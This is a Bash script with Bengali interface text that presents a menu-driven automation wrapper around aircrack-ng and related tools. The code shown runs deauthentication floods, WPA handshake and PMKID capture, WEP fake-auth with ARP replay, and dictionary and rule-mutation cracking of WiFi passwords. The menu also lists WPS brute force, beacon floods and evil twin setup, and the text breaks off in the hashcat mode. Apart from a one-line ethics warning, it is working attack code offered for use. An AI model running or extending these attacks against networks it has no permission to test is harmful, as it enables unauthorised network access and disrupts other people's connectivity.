#!/bin/bash

# ================================================================
#   AIRCRACK-NG - Full Automation Tool
#   Author: SAIMUM
# ================================================================

# --- Colors ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
WHITE='\033[1;37m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m'

RESULTS_DIR="$HOME/aircrack_results"
HISTORY_FILE="$HOME/.aircrack_saimum_history.log"
mkdir -p "$RESULTS_DIR"

# ================================================================
# BANNER
# ================================================================
show_banner() {
    clear
    echo -e "${CYAN}${BOLD}"
    echo ' █████╗ ██╗██████╗  ██████╗██████╗  █████╗  ██████╗██╗  ██╗'
    echo '██╔══██╗██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝'
    echo '███████║██║██████╔╝██║     ██████╔╝███████║██║     █████╔╝ '
    echo '██╔══██║██║██╔══██╗██║     ██╔══██╗██╔══██║██║     ██╔═██╗ '
    echo '██║  ██║██║██║  ██║╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗'
    echo '╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝'
    echo ''
    echo '    ███╗   ██╗ ██████╗'
    echo '    ████╗  ██║██╔════╝'
    echo '    ██╔██╗ ██║██║  ███╗'
    echo '    ██║╚██╗██║██║   ██║'
    echo '    ██║ ╚████║╚██████╔╝'
    echo '    ╚═╝  ╚═══╝ ╚═════╝'
    echo -e "${NC}"
    echo -e "${YELLOW}${BOLD}    ╔═══════════════════════════════════════════════════════╗${NC}"
    echo -e "${WHITE}${BOLD}    ║                    S A I M U M                        ║${NC}"
    echo -e "${YELLOW}${BOLD}    ╚═══════════════════════════════════════════════════════╝${NC}"
    echo -e "${DIM}${WHITE}         Aircrack-ng Full Automation | WiFi Security Auditing${NC}"
    echo ""
    echo -e "  ${RED}${BOLD}⚠  Ethics Warning:${NC} ${WHITE}শুধুমাত্র নিজের বা অনুমতি আছে এমন network এ ব্যবহার করুন।${NC}"
    echo ""
}

# ================================================================
# CHECK DEPENDENCIES
# ================================================================
check_deps() {
    echo -e "${CYAN}[*] Dependencies চেক করা হচ্ছে...${NC}"
    local missing=()

    for tool in aircrack-ng airodump-ng aireplay-ng airmon-ng iwconfig iw; do
        if command -v "$tool" &>/dev/null; then
            echo -e "  ${GREEN}[✓] $tool${NC}"
        else
            missing+=("$tool")
            echo -e "  ${RED}[✗] $tool — পাওয়া যায়নি${NC}"
        fi
    done

    echo ""
    echo -e "${CYAN}[*] Optional tools:${NC}"
    for opt in hashcat john hcxtools hcxdumptool cowpatty pyrit reaver bully mdk3 mdk4 macchanger; do
        if command -v "$opt" &>/dev/null; then
            echo -e "  ${GREEN}[✓] $opt${NC}"
        else
            echo -e "  ${YELLOW}[!] $opt — নেই (optional)${NC}"
        fi
    done

    if [ ${#missing[@]} -ne 0 ]; then
        echo ""
        echo -e "${RED}[!] Missing: ${missing[*]}${NC}"
        echo -e "${YELLOW}Install করুন: sudo apt install aircrack-ng${NC}"
        exit 1
    fi

    # Root check
    if [ "$EUID" -ne 0 ]; then
        echo ""
        echo -e "${RED}${BOLD}[!] Warning: বেশিরভাগ WiFi operation এ root/sudo দরকার।${NC}"
        echo -e "${YELLOW}    sudo ./aircrack_saimum.sh দিয়ে চালান।${NC}"
    fi

    # Wireless interface detect
    echo ""
    echo -e "${CYAN}[*] Wireless interfaces:${NC}"
    INTERFACES=()
    while IFS= read -r iface; do
        INTERFACES+=("$iface")
        echo -e "  ${GREEN}[✓] $iface${NC}"
    done < <(iw dev 2>/dev/null | grep "Interface" | awk '{print $2}')

    if [ ${#INTERFACES[@]} -eq 0 ]; then
        echo -e "  ${YELLOW}[!] কোনো wireless interface পাওয়া যায়নি।${NC}"
        echo -e "  ${DIM}    iwconfig বা ip link দিয়ে check করুন।${NC}"
    fi

    # Wordlist check
    echo ""
    echo -e "${CYAN}[*] Wordlist চেক করা হচ্ছে...${NC}"
    DEFAULT_WORDLIST=""
    for wl in "/usr/share/wordlists/rockyou.txt" "/usr/share/wordlists/fasttrack.txt" "$HOME/wordlists/rockyou.txt"; do
        if [ -f "$wl" ]; then
            DEFAULT_WORDLIST="$wl"
            echo -e "  ${GREEN}[✓] $wl${NC}"
            break
        fi
    done
    [ -z "$DEFAULT_WORDLIST" ] && echo -e "  ${YELLOW}[!] Default wordlist পাওয়া যায়নি।${NC}"
    echo ""
}

# ================================================================
# SELECT INTERFACE
# ================================================================
select_interface() {
    INTERFACE=""

    echo -e "${CYAN}${BOLD}╔══════════════════════════════════════╗${NC}"
    echo -e "${CYAN}${BOLD}║      WIRELESS INTERFACE SELECT       ║${NC}"
    echo -e "${CYAN}${BOLD}╚══════════════════════════════════════╝${NC}"
    echo ""

    # Show available interfaces
    echo -e "${WHITE}Available interfaces:${NC}"
    local i=1
    local iface_list=()
    while IFS= read -r line; do
        local iface; iface=$(echo "$line" | awk '{print $2}')
        iface_list+=("$iface")
        local mode; mode=$(iwconfig "$iface" 2>/dev/null | grep "Mode:" | awk '{print $1}')
        echo -e "  ${GREEN}$i)${NC} $iface  ${DIM}$mode${NC}"
        i=$((i+1))
    done < <(iw dev 2>/dev/null | grep "Interface")

    if [ ${#iface_list[@]} -eq 0 ]; then
        echo -e "  ${YELLOW}[!] কোনো interface পাওয়া যায়নি।${NC}"
        read -p "$(echo -e ${WHITE}"Manually interface name দিন: "${NC})" INTERFACE
    else
        read -p "$(echo -e ${YELLOW}"Select [1-${#iface_list[@]}] বা manually নাম দিন: "${NC})" iface_ch
        if [[ "$iface_ch" =~ ^[0-9]+$ ]] && [ "$iface_ch" -le "${#iface_list[@]}" ]; then
            INTERFACE="${iface_list[$((iface_ch-1))]}"
        else
            INTERFACE="$iface_ch"
        fi
    fi

    echo -e "  ${GREEN}[✓] Interface: $INTERFACE${NC}"
    echo ""
}

# ================================================================
# MONITOR MODE
# ================================================================
enable_monitor_mode() {
    local iface=$1
    echo ""
    echo -e "${CYAN}[*] Monitor mode enable করা হচ্ছে: $iface${NC}"

    # Check if already in monitor mode
    if iwconfig "$iface" 2>/dev/null | grep -q "Mode:Monitor"; then
        echo -e "  ${GREEN}[✓] Already in monitor mode${NC}"
        MON_INTERFACE="$iface"
        return
    fi

    # Kill interfering processes
    echo -e "${YELLOW}[*] Interfering processes kill করা হচ্ছে...${NC}"
    airmon-ng check kill 2>/dev/null
    sleep 1

    # Enable monitor mode
    airmon-ng start "$iface" 2>/dev/null
    sleep 2

    # Detect monitor interface name
    MON_INTERFACE=""
    for possible in "${iface}mon" "wlan0mon" "mon0" "$iface"; do
        if iwconfig "$possible" 2>/dev/null | grep -q "Mode:Monitor"; then
            MON_INTERFACE="$possible"
            break
        fi
    done

    if [ -n "$MON_INTERFACE" ]; then
        echo -e "  ${GREEN}[✓] Monitor mode enabled: $MON_INTERFACE${NC}"
    else
        echo -e "  ${RED}[!] Monitor mode enable হয়নি।${NC}"
        echo -e "  ${YELLOW}Try: sudo ip link set $iface down && sudo iw $iface set monitor control && sudo ip link set $iface up${NC}"
        MON_INTERFACE="$iface"
    fi
    echo ""
}

# ================================================================
# DISABLE MONITOR MODE
# ================================================================
disable_monitor_mode() {
    local iface=$1
    echo ""
    echo -e "${CYAN}[*] Monitor mode disable করা হচ্ছে: $iface${NC}"
    airmon-ng stop "$iface" 2>/dev/null
    service NetworkManager restart 2>/dev/null || systemctl restart NetworkManager 2>/dev/null
    echo -e "  ${GREEN}[✓] Monitor mode disabled${NC}"
    echo ""
}

# ================================================================
# SCAN MENU
# ================================================================
show_menu() {
    echo -e "${YELLOW}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${YELLOW}${BOLD}║                  AIRCRACK-NG SCAN OPTIONS                           ║${NC}"
    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}━━━ NETWORK SCANNING ━━━${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}1${NC}  Network Scan (All)            — আশেপাশের সব WiFi দেখো"
    echo -e "${YELLOW}║${NC} ${GREEN}2${NC}  Specific Channel Scan         — নির্দিষ্ট channel scan"
    echo -e "${YELLOW}║${NC} ${GREEN}3${NC}  Target Network Scan           — নির্দিষ্ট BSSID/ESSID"
    echo -e "${YELLOW}║${NC} ${GREEN}4${NC}  Hidden SSID Detection         — hidden network খোঁজা"
    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}━━━ HANDSHAKE CAPTURE ━━━${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}5${NC}  Capture WPA Handshake        — handshake capture করো"
    echo -e "${YELLOW}║${NC} ${GREEN}6${NC}  Deauth Attack + Capture       — client disconnect করে capture"
    echo -e "${YELLOW}║${NC} ${GREEN}7${NC}  PMKID Attack (No Client)     — client ছাড়া attack"
    echo -e "${YELLOW}║${NC} ${GREEN}8${NC}  Continuous Capture            — লম্বা সময় capture"
    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}━━━ PASSWORD CRACKING ━━━${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}9${NC}  Crack WPA/WPA2 (Wordlist)    — dictionary attack"
    echo -e "${YELLOW}║${NC} ${GREEN}10${NC} Crack WEP                     — WEP crack (trivial)"
    echo -e "${YELLOW}║${NC} ${GREEN}11${NC} Crack with Rules              — wordlist + mutation rules"
    echo -e "${YELLOW}║${NC} ${GREEN}12${NC} Crack with Hashcat (GPU)      — GPU accelerated crack"
    echo -e "${YELLOW}║${NC} ${GREEN}13${NC} Crack with PMKID Hash         — PMKID crack"
    echo -e "${YELLOW}║${NC} ${GREEN}14${NC} Multiple Wordlists            — একাধিক wordlist"
    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}━━━ DEAUTH & DOS ATTACKS ━━━${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}15${NC} Deauth Attack (Broadcast)    — সব client disconnect"
    echo -e "${YELLOW}║${NC} ${GREEN}16${NC} Deauth Attack (Targeted)     — নির্দিষ্ট client disconnect"
    echo -e "${YELLOW}║${NC} ${GREEN}17${NC} Beacon Flood (MDK)           — fake AP flood"
    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}━━━ WPS ATTACKS ━━━${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}18${NC} WPS PIN Attack (Reaver)      — WPS brute force"
    echo -e "${YELLOW}║${NC} ${GREEN}19${NC} WPS Pixie Dust Attack        — WPS offline attack"
    echo -e "${YELLOW}║${NC} ${GREEN}20${NC} WPS Scan                     — WPS enabled AP খোঁজো"
    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}━━━ EVIL TWIN & MITM ━━━${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}21${NC} Evil Twin AP Setup Guide     — fake AP তৈরির guide"
    echo -e "${YELLOW}║${NC} ${GREEN}22${NC} MAC Address Spoof            — MAC address পরিবর্তন"
    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}━━━ MONITOR MODE ━━━${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}23${NC} Enable Monitor Mode          — monitor mode চালু"
    echo -e "${YELLOW}║${NC} ${GREEN}24${NC} Disable Monitor Mode         — monitor mode বন্ধ"
    echo -e "${YELLOW}║${NC} ${GREEN}25${NC} Interface Info               — interface details"
    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}━━━ COMBO ━━━${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}26${NC} Full Auto Attack             — scan→capture→crack"
    echo -e "${YELLOW}║${NC} ${GREEN}27${NC} All-in-One Audit             — সব কিছু একসাথে"
    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC}  ${RED}0)${NC} Exit                                                               ${YELLOW}║${NC}"
    echo -e "${YELLOW}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

# ================================================================
# MODE 1 — NETWORK SCAN ALL
# ================================================================
mode_network_scan() {
    select_interface
    enable_monitor_mode "$INTERFACE"

    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local out="$RESULTS_DIR/scan_${ts}"
    SCAN_LABEL="Network Scan"

    echo -e "${CYAN}[*] Network scan শুরু হচ্ছে — Ctrl+C দিয়ে বন্ধ করুন${NC}"
    echo ""

    airodump-ng "$MON_INTERFACE" --write "$out" --output-format csv,cap 2>/dev/null

    echo ""
    echo -e "${GREEN}[✓] Scan সম্পন্ন! Files: ${out}-01.csv, ${out}-01.cap${NC}"
    bangla_analysis_scan "${out}-01.csv"
    suggest_next_tool_scan "${out}-01.csv"
    save_results "$out"
}

# ================================================================
# MODE 2 — SPECIFIC CHANNEL SCAN
# ================================================================
mode_channel_scan() {
    select_interface
    enable_monitor_mode "$INTERFACE"

    read -p "$(echo -e ${WHITE}"Channel দিন (e.g. 1,6,11 বা 1-13): "${NC})" channels
    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local out="$RESULTS_DIR/ch_scan_${ts}"
    SCAN_LABEL="Channel Scan ($channels)"

    echo ""
    echo -e "${CYAN}[*] Channel $channels scan করা হচ্ছে...${NC}"
    airodump-ng "$MON_INTERFACE" --channel "$channels" --write "$out" --output-format csv,cap 2>/dev/null

    bangla_analysis_scan "${out}-01.csv"
    suggest_next_tool_scan "${out}-01.csv"
    save_results "$out"
}

# ================================================================
# MODE 3 — TARGET NETWORK SCAN
# ================================================================
mode_target_scan() {
    select_interface
    enable_monitor_mode "$INTERFACE"

    read -p "$(echo -e ${WHITE}"Target BSSID দিন (MAC, e.g. AA:BB:CC:DD:EE:FF): "${NC})" TARGET_BSSID
    read -p "$(echo -e ${WHITE}"Channel দিন: "${NC})" TARGET_CH
    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local out="$RESULTS_DIR/target_${ts}"
    SCAN_LABEL="Target Scan ($TARGET_BSSID)"

    echo ""
    echo -e "${CYAN}[*] Target $TARGET_BSSID scan করা হচ্ছে...${NC}"
    airodump-ng "$MON_INTERFACE" --bssid "$TARGET_BSSID" --channel "$TARGET_CH" \
        --write "$out" --output-format csv,cap 2>/dev/null

    bangla_analysis_scan "${out}-01.csv"
    save_results "$out"
}

# ================================================================
# MODE 4 — HIDDEN SSID DETECTION
# ================================================================
mode_hidden_ssid() {
    select_interface
    enable_monitor_mode "$INTERFACE"

    echo ""
    echo -e "${CYAN}${BOLD}Hidden SSID Detection:${NC}"
    echo -e "  ${WHITE}Hidden AP গুলো SSID broadcast করে না কিন্তু probe response এ দেখায়।${NC}"
    echo ""

    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local out="$RESULTS_DIR/hidden_${ts}"
    SCAN_LABEL="Hidden SSID Scan"

    echo -e "${CYAN}[*] Hidden SSIDs detect করা হচ্ছে...${NC}"
    # Scan for all including hidden
    airodump-ng "$MON_INTERFACE" --write "$out" --output-format csv 2>/dev/null &
    local AIRODUMP_PID=$!
    sleep 30
    kill $AIRODUMP_PID 2>/dev/null

    # Find hidden SSIDs (empty or length-only SSID)
    if [ -f "${out}-01.csv" ]; then
        echo ""
        echo -e "${CYAN}[*] Hidden networks (probe responses থেকে):${NC}"
        grep -E "^\s*$|length:" "${out}-01.csv" 2>/dev/null | head -20 | \
            while IFS= read -r line; do echo -e "  ${YELLOW}▸ $line${NC}"; done
    fi

    echo ""
    echo -e "${CYAN}💡 Client probe করলে SSID reveal হবে:${NC}"
    echo -e "  ${WHITE}airodump-ng $MON_INTERFACE (probe response দেখুন)${NC}"
    bangla_analysis_scan "${out}-01.csv"
    save_results "$out"
}

# ================================================================
# MODE 5 — CAPTURE WPA HANDSHAKE
# ================================================================
mode_capture_handshake() {
    select_interface
    enable_monitor_mode "$INTERFACE"

    echo ""
    read -p "$(echo -e ${WHITE}"Target BSSID দিন: "${NC})" TARGET_BSSID
    read -p "$(echo -e ${WHITE}"Channel দিন: "${NC})" TARGET_CH
    read -p "$(echo -e ${WHITE}"ESSID/Network name দিন: "${NC})" TARGET_ESSID

    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local safe; safe=$(echo "$TARGET_ESSID" | sed 's/[^a-zA-Z0-9._-]/_/g')
    local out="$RESULTS_DIR/handshake_${safe}_${ts}"
    SCAN_LABEL="Handshake Capture ($TARGET_ESSID)"
    CAP_FILE="${out}-01.cap"

    echo ""
    echo -e "${GREEN}${BOLD}[*] Handshake capture শুরু হচ্ছে...${NC}"
    echo -e "${YELLOW}[!] Client এর connection wait করুন। Ctrl+C দিয়ে বন্ধ করুন।${NC}"
    echo ""

    airodump-ng "$MON_INTERFACE" \
        --bssid "$TARGET_BSSID" \
        --channel "$TARGET_CH" \
        --write "$out" \
        --output-format cap,csv 2>/dev/null

    echo ""
    # Check handshake
    if aircrack-ng "$CAP_FILE" 2>/dev/null | grep -q "1 handshake"; then
        echo -e "${GREEN}${BOLD}[✓] WPA Handshake captured! → $CAP_FILE${NC}"
        CAPTURED_HANDSHAKE="$CAP_FILE"
    else
        echo -e "${YELLOW}[!] Handshake পাওয়া যায়নি — Deauth attack try করুন (mode 6)।${NC}"
    fi

    bangla_analysis_handshake "$CAP_FILE" "$TARGET_ESSID"
    suggest_next_tool_handshake "$CAP_FILE"
    save_results "$out"
}

# ================================================================
# MODE 6 — DEAUTH + CAPTURE
# ================================================================
mode_deauth_capture() {
    select_interface
    enable_monitor_mode "$INTERFACE"

    echo ""
    read -p "$(echo -e ${WHITE}"Target BSSID দিন: "${NC})" TARGET_BSSID
    read -p "$(echo -e ${WHITE}"Channel দিন: "${NC})" TARGET_CH
    read -p "$(echo -e ${WHITE}"ESSID দিন: "${NC})" TARGET_ESSID
    read -p "$(echo -e ${WHITE}"Client MAC (Enter=broadcast FF:FF:FF:FF:FF:FF): "${NC})" CLIENT_MAC
    [ -z "$CLIENT_MAC" ] && CLIENT_MAC="FF:FF:FF:FF:FF:FF"

    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local safe; safe=$(echo "$TARGET_ESSID" | sed 's/[^a-zA-Z0-9._-]/_/g')
    local out="$RESULTS_DIR/deauth_capture_${safe}_${ts}"
    SCAN_LABEL="Deauth + Capture ($TARGET_ESSID)"
    CAP_FILE="${out}-01.cap"

    echo ""
    echo -e "${GREEN}${BOLD}[*] Capture শুরু হচ্ছে background এ...${NC}"

    # Start capture in background
    airodump-ng "$MON_INTERFACE" \
        --bssid "$TARGET_BSSID" \
        --channel "$TARGET_CH" \
        --write "$out" \
        --output-format cap,csv &>/dev/null &
    local AIRODUMP_PID=$!

    sleep 3
    echo -e "${RED}${BOLD}[*] Deauth packets পাঠানো হচ্ছে...${NC}"

    # Send deauth
    aireplay-ng --deauth 10 \
        -a "$TARGET_BSSID" \
        -c "$CLIENT_MAC" \
        "$MON_INTERFACE" 2>/dev/null

    sleep 5

    # Check handshake
    if aircrack-ng "$CAP_FILE" 2>/dev/null | grep -q "1 handshake"; then
        echo -e "${GREEN}${BOLD}[✓] WPA Handshake captured!${NC}"
        CAPTURED_HANDSHAKE="$CAP_FILE"
    else
        echo -e "${YELLOW}[!] Handshake নেই — আরো deauth packets পাঠাবেন?${NC}"
        read -p "$(echo -e ${YELLOW}"আবার try? (y/n): "${NC})" retry
        if [[ "$retry" =~ ^[Yy]$ ]]; then
            aireplay-ng --deauth 20 -a "$TARGET_BSSID" -c "$CLIENT_MAC" "$MON_INTERFACE" 2>/dev/null
            sleep 5
        fi
    fi

    kill $AIRODUMP_PID 2>/dev/null
    echo ""

    bangla_analysis_handshake "$CAP_FILE" "$TARGET_ESSID"
    suggest_next_tool_handshake "$CAP_FILE"
    save_results "$out"
}

# ================================================================
# MODE 7 — PMKID ATTACK
# ================================================================
mode_pmkid_attack() {
    echo ""
    echo -e "${CYAN}${BOLD}PMKID Attack — Client ছাড়া WPA handshake capture:${NC}"
    echo ""

    if command -v hcxdumptool &>/dev/null; then
        select_interface
        enable_monitor_mode "$INTERFACE"

        read -p "$(echo -e ${WHITE}"Target BSSID দিন (Enter=সব): "${NC})" TARGET_BSSID
        local ts; ts=$(date +"%Y%m%d_%H%M%S")
        local out="$RESULTS_DIR/pmkid_${ts}"
        SCAN_LABEL="PMKID Attack"

        local filter_opt=""
        if [ -n "$TARGET_BSSID" ]; then
            local mac_clean; mac_clean=$(echo "$TARGET_BSSID" | tr -d ':')
            echo "$mac_clean" > /tmp/filter_mac.txt
            filter_opt="--filterlist_ap=/tmp/filter_mac.txt --filtermode=2"
        fi

        echo ""
        echo -e "${GREEN}[*] PMKID capture শুরু হচ্ছে (60 seconds)...${NC}"
        timeout 60 hcxdumptool -i "$MON_INTERFACE" \
            -o "${out}.pcapng" \
            $filter_opt \
            --enable_status=1 2>/dev/null

        # Convert
        if command -v hcxpcapngtool &>/dev/null && [ -f "${out}.pcapng" ]; then
            hcxpcapngtool -o "${out}.22000" "${out}.pcapng" 2>/dev/null
            echo -e "${GREEN}[✓] PMKID hash file: ${out}.22000${NC}"
            echo -e "${CYAN}💡 Crack করুন:${NC}"
            echo -e "  ${CYAN}hashcat -m 22000 ${out}.22000 $DEFAULT_WORDLIST${NC}"
            PMKID_HASH="${out}.22000"
        fi

        bangla_analysis_pmkid "${out}.22000"
        save_results "$out"
    else
        echo -e "${YELLOW}[!] hcxdumptool পাওয়া যায়নি।${NC}"
        echo -e "${CYAN}Install: sudo apt install hcxdumptool hcxtools${NC}"
        echo ""
        echo -e "${WHITE}Manual PMKID command:${NC}"
        echo -e "  ${CYAN}hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1${NC}"
        echo -e "  ${CYAN}hcxpcapngtool -o pmkid.22000 pmkid.pcapng${NC}"
        echo -e "  ${CYAN}hashcat -m 22000 pmkid.22000 rockyou.txt${NC}"
    fi
}

# ================================================================
# MODE 8 — CONTINUOUS CAPTURE
# ================================================================
mode_continuous_capture() {
    select_interface
    enable_monitor_mode "$INTERFACE"

    read -p "$(echo -e ${WHITE}"Target BSSID দিন: "${NC})" TARGET_BSSID
    read -p "$(echo -e ${WHITE}"Channel দিন: "${NC})" TARGET_CH
    read -p "$(echo -e ${WHITE}"ESSID দিন: "${NC})" TARGET_ESSID
    read -p "$(echo -e ${WHITE}"Duration (minutes, Enter=30): "${NC})" dur
    [ -z "$dur" ] && dur=30

    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local safe; safe=$(echo "$TARGET_ESSID" | sed 's/[^a-zA-Z0-9._-]/_/g')
    local out="$RESULTS_DIR/continuous_${safe}_${ts}"
    SCAN_LABEL="Continuous Capture ($dur min)"
    CAP_FILE="${out}-01.cap"

    echo ""
    echo -e "${GREEN}[*] $dur মিনিটের জন্য capture শুরু হচ্ছে...${NC}"
    echo -e "${YELLOW}[!] Ctrl+C দিয়েও বন্ধ করা যাবে।${NC}"
    echo ""

    timeout $((dur * 60)) airodump-ng "$MON_INTERFACE" \
        --bssid "$TARGET_BSSID" \
        --channel "$TARGET_CH" \
        --write "$out" \
        --output-format cap,csv 2>/dev/null

    echo ""
    echo -e "${GREEN}[✓] Capture সম্পন্ন → $CAP_FILE${NC}"

    if aircrack-ng "$CAP_FILE" 2>/dev/null | grep -q "handshake"; then
        echo -e "${GREEN}[✓] Handshake found!${NC}"
        CAPTURED_HANDSHAKE="$CAP_FILE"
    fi

    bangla_analysis_handshake "$CAP_FILE" "$TARGET_ESSID"
    suggest_next_tool_handshake "$CAP_FILE"
    save_results "$out"
}

# ================================================================
# MODE 9 — CRACK WPA/WPA2
# ================================================================
mode_crack_wpa() {
    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    SCAN_LABEL="WPA Crack"

    echo ""
    read -p "$(echo -e ${WHITE}"Capture file (.cap) path দিন: "${NC})" cap_file
    if [ ! -f "$cap_file" ]; then
        echo -e "${RED}[!] File পাওয়া যায়নি।${NC}"
        return
    fi

    read -p "$(echo -e ${WHITE}"Wordlist path (Enter=default): "${NC})" wl_path
    [ -z "$wl_path" ] && wl_path="$DEFAULT_WORDLIST"
    if [ ! -f "$wl_path" ]; then
        echo -e "${RED}[!] Wordlist পাওয়া যায়নি।${NC}"
        return
    fi

    read -p "$(echo -e ${WHITE}"ESSID filter দিন (Enter=সব): "${NC})" essid_filter
    local essid_opt=""
    [ -n "$essid_filter" ] && essid_opt="-e '$essid_filter'"

    local out="$RESULTS_DIR/crack_wpa_${ts}.txt"

    echo ""
    echo -e "${GREEN}[*] WPA/WPA2 crack শুরু হচ্ছে...${NC}"
    echo -e "${YELLOW}[!] চলছে... Ctrl+C দিয়ে বন্ধ করুন${NC}"
    echo ""

    local tmp; tmp=$(mktemp)
    eval "aircrack-ng $essid_opt -w '$wl_path' '$cap_file'" 2>&1 | tee "$tmp"

    echo ""
    bangla_analysis_crack "$tmp"
    suggest_next_tool_crack "$tmp"

    read -p "$(echo -e ${YELLOW}"Result save করবেন? (y/n): "${NC})" sv
    if [[ "$sv" =~ ^[Yy]$ ]]; then
        cp "$tmp" "$out"
        echo -e "${GREEN}[✓] Saved: $out${NC}"
        echo "$(date) | WPA Crack | $cap_file | $out" >> "$HISTORY_FILE"
    fi
    rm -f "$tmp"
}

# ================================================================
# MODE 10 — CRACK WEP
# ================================================================
mode_crack_wep() {
    select_interface
    enable_monitor_mode "$INTERFACE"

    echo ""
    read -p "$(echo -e ${WHITE}"Target BSSID দিন: "${NC})" TARGET_BSSID
    read -p "$(echo -e ${WHITE}"Channel দিন: "${NC})" TARGET_CH

    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local out="$RESULTS_DIR/wep_${ts}"
    SCAN_LABEL="WEP Crack"

    echo ""
    echo -e "${RED}${BOLD}[*] WEP attack শুরু হচ্ছে...${NC}"
    echo -e "${YELLOW}[!] WEP অত্যন্ত দুর্বল — সাধারণত কয়েক মিনিটে crack হয়।${NC}"
    echo ""

    # Capture in background
    airodump-ng "$MON_INTERFACE" \
        --bssid "$TARGET_BSSID" \
        --channel "$TARGET_CH" \
        --write "$out" \
        --output-format cap &>/dev/null &
    local AIRODUMP_PID=$!

    sleep 3

    # Fake authentication
    echo -e "${CYAN}[*] Fake authentication...${NC}"
    aireplay-ng --fakeauth 0 -a "$TARGET_BSSID" "$MON_INTERFACE" 2>/dev/null &
    sleep 2

    # ARP replay
    echo -e "${CYAN}[*] ARP replay attack...${NC}"
    aireplay-ng --arpreplay -b "$TARGET_BSSID" "$MON_INTERFACE" 2>/dev/null &
    local REPLAY_PID=$!

    # Wait for enough IVs
    echo -e "${YELLOW}[*] IVs collect হচ্ছে (30 seconds)...${NC}"
    sleep 30

    kill $AIRODUMP_PID $REPLAY_PID 2>/dev/null

    # Crack
    echo ""
    echo -e "${GREEN}[*] WEP key crack করা হচ্ছে...${NC}"
    local tmp; tmp=$(mktemp)
    aircrack-ng "${out}-01.cap" 2>&1 | tee "$tmp"

    bangla_analysis_crack "$tmp"
    rm -f "$tmp"
    save_results "$out"
}

# ================================================================
# MODE 11 — CRACK WITH RULES
# ================================================================
mode_crack_rules() {
    echo ""
    read -p "$(echo -e ${WHITE}"Capture file path: "${NC})" cap_file
    [ ! -f "$cap_file" ] && echo -e "${RED}[!] File নেই।${NC}" && return

    read -p "$(echo -e ${WHITE}"Wordlist path (Enter=default): "${NC})" wl_path
    [ -z "$wl_path" ] && wl_path="$DEFAULT_WORDLIST"

    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local tmp; tmp=$(mktemp)
    SCAN_LABEL="WPA Crack + Rules"

    # Generate mutations
    local mutated_wl="$RESULTS_DIR/mutated_wl_${ts}.txt"
    echo -e "${CYAN}[*] Wordlist mutation তৈরি হচ্ছে...${NC}"

    if command -v john &>/dev/null; then
        john --wordlist="$wl_path" --rules=Best64 --stdout > "$mutated_wl" 2>/dev/null
        echo -e "  ${GREEN}[✓] John rules applied${NC}"
    else
        # Manual mutation
        while IFS= read -r word; do
            echo "$word"
            echo "${word}123"
            echo "${word}1234"
            echo "${word}!"
            echo "${word^}"
            echo "${word^^}"
        done < "$wl_path" > "$mutated_wl" 2>/dev/null
        echo -e "  ${CYAN}[*] Basic mutation applied${NC}"
    fi

    local mut_count; mut_count=$(wc -l < "$mutated_wl")
    echo -e "  ${GREEN}[✓] Mutated wordlist: $mut_count entries${NC}"
    echo ""

    echo -e "${GREEN}[*] Cracking with mutated wordlist...${NC}"
    aircrack-ng -w "$mutated_wl" "$cap_file" 2>&1 | tee "$tmp"

    bangla_analysis_crack "$tmp"
    suggest_next_tool_crack "$tmp"
    rm -f "$tmp"
    echo "$(date) | WPA Rules Crack | $cap_file" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 12 — CRACK WITH HASHCAT
# ================================================================
mode_crack_hashcat() {
    if ! command -v hashcat &>/dev/null; then
        echo -e "${RED}[!] hashcat পাওয়া যায়নি।${NC}"
        echo -e "${CYAN}Install: sudo apt install hashcat${NC}"
        return
    fi

    echo ""
    read -p "$(echo -e ${WHITE}"Capture file (.cap/.22000/.hccapx) path: "${NC})" cap_file
